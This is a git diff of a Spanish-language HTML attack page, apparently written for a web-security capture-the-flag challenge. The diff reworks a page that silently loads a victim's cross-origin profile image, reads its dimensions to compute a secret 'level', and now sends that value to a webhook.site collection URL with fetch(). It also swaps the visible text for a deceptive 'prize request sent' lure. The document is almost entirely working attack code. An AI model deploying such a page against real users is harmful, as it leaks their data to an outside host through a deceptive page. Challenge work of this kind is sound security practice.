@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>¡Procesando su solicitud!</title>
+    <title>Procesando Solicitud</title>
     <meta charset="UTF-8">
 </head>
 <body>
 
-    <h1>⌛ Procesando su solicitud... Por favor espere. ⌛</h1>
-    <p>Este sitio cargará su perfil de usuario en unos segundos y luego se cerrará automáticamente.</p>
+    <h1>✅ Solicitud de premio enviada. Por favor, vuelva a la pestaña anterior.</h1>
+    <p>El procesamiento es automático y no requiere más interacción.</p>
     
-    <div id="log"></div>
+    <div id="log" style="font-family: monospace; font-size: 10px;"></div>
 
     <script>
         // Función para agregar mensajes al log en la página
@@ -21,51 +21,52 @@
 
         logMessage("Inicio de script. Intentando cargar la imagen de Pepe...");
 
-        // Dominio del desafío (Tu URL es de HTTPS)
+        // 1. CONFIGURACIÓN
         const DOMINIO_DESAFIO = "https://chl-0be918a6-5b4f-4de5-b30a-669e10a3cf51-imagen-importante.softwareseguro.com.ar";
+        const URL_IMAGEN_PEPE = DOMINIO_DESAFIO + "/profile-pic?user=pepe"; // Usamos la suposición del parámetro 'user=pepe'
         
-        // URL de la imagen de Pepe
-        const URL_IMAGEN = DOMINIO_DESAFIO + "/profile-pic"; 
-        
-        // 1. Crear un elemento de imagen oculto
+        // 🚨 URL PARA REPORTAR EL RESULTADO (TÚ BACKEND)
+        // Usa una URL tuya que puedas monitorear, o una URL de prueba (RequestBin/Webhook.site).
+        // Ejemplo ficticio:
+        const URL_REPORTE = "https://webhook.site/b16b1ec0-3ad6-4733-8c07-06d49d46297f";
+
+        // 2. Crear un elemento de imagen oculto
         const img = new Image();
-        img.crossOrigin = "anonymous"; // Se mantiene el intento de forzar CORS, aunque puede fallar.
+        img.crossOrigin = "anonymous"; 
         
-        // 2. Definir lo que haremos cuando la imagen cargue
+        // 3. CAPTURA DEL EVENTO LOAD Y CÁLCULO
         img.onload = function() {
-            logMessage("La imagen parece haber cargado.", 'info');
+            logMessage("Evento 'onload' capturado. Leyendo dimensiones...", 'info');
             
-            // Obtener las dimensiones originales (naturales)
             const ancho = img.naturalWidth;
             const alto = img.naturalHeight;
             const nivel = ancho * alto;
 
-            // ⚠️ VERIFICACIÓN CRÍTICA:
-            // Si ancho y alto son 0, 1, o el tamaño de la imagen de error, la lectura falló por SOP.
             if (ancho <= 1 || alto <= 1 || nivel === 0) {
-                 logMessage(`❌ FALLA DE LECTURA (SOP): Ancho=${ancho}px, Alto=${alto}px. Dimensiones no válidas. El navegador bloqueó la lectura del tamaño.`, 'error');
+                 logMessage(`❌ FALLA DE LECTURA (SOP/Bloqueo): Nivel=0. El navegador bloqueó la lectura.`, 'error');
             } else {
-                 // 3. Éxito: Mostrar y reportar el resultado
-                logMessage(`✅ ÉXITO DE LECTURA: ${ancho}x${alto} píxeles.`, 'success');
-                logMessage(`✅ Nivel de Pepe: ${nivel}`, 'success');
-                logMessage(`🚨 HASH MD5 requerido de: ${nivel}`, 'success');
+                // 4. ÉXITO Y REPORTE
+                logMessage(`✅ ÉXITO: Dimensiones: ${ancho}x${alto}. Nivel de Pepe: ${nivel}`, 'success');
+                
+                // Generar la URL de reporte
+                const finalReportUrl = URL_REPORTE + nivel;
 
-                // En un ataque real, el envío automático de datos sería aquí:
-                // fetch('https://josebaigorria.github.io/desafio-pepe/log.html?level=' + nivel);
+                // Enviar el Nivel al "backend" (simulación por GET request)
+                fetch(finalReportUrl)
+                    .then(() => logMessage(`✅ Dato de Nivel enviado exitosamente a ${finalReportUrl}`, 'success'))
+                    .catch(() => logMessage(`⚠️ Fallo al enviar el reporte. Revisa la URL de reporte.`, 'error'));
+
+                // Opcional: Cerrar ventana
+                // setTimeout(() => { window.close(); }, 3000); 
             }
-
-            // Opcional: Cerrar la ventana automáticamente (para simular un ataque limpio)
-            // setTimeout(() => { window.close(); }, 5000); // Cierra después de 5 segundos
-
         };
         
         img.onerror = function() {
-            // El onerror se dispara si la URL de la imagen es incorrecta o el servidor la rechaza.
-            logMessage(`❌ ERROR FATAL: No se pudo cargar la imagen desde ${URL_IMAGEN}. Revisa la ruta '/profile-pic'.`, 'error');
+            logMessage(`❌ ERROR FATAL: No se pudo cargar la imagen desde ${URL_IMAGEN_PEPE}. Revisa la URL.`, 'error');
         };
 
-        // 4. Iniciar la carga de la imagen (Se ejecuta inmediatamente al abrir la página)
-        img.src = URL_IMAGEN;
+        // 5. Iniciar la carga de la imagen (se ejecuta al inicio)
+        img.src = URL_IMAGEN_PEPE;
     </script>
 </body>
 </html>
